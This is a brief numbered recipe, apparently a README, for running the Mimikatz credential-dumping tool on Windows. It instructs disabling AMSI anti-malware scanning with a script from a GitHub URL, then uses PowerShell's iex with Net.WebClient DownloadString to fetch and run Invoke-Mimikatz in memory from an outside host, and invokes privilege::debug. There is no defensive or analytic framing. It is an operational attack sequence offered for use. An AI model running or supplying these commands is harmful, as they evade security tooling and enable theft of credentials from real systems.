1. Open Powershell as Admin
2. Disable AMSI (paste the following): https://raw.githubusercontent.com/jj4152/invoke-mimikatz/main/disable-amsi
3. Load Mimikatz into Memory: iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jj4152/invoke-mimikatz/main/invoke-mimikatz.ps1')
4. Execute desired command: Invoke-Mimikatz -Command "privilege::debug"
